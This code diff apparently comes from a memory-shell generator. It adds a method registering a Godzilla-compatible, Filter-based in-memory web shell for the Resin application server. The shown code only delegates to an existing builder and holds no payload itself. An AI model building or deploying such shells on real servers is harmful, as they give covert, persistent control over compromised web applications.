@@ -224,6 +224,13 @@ public class MSJavaClassBuilder {
         return defaultOriginalMS(cls, javaClassHelper);
     }
 
+    @Middleware(Middleware.Resin)
+    @MemShell(MemShell.Filter)
+    @MemShellFunction(MemShellFunction.Godzilla)
+    public byte[] resinFilterGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
     public void resinListenerResponseMaker(CtClass ctClass) throws Exception{
         // response
         CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
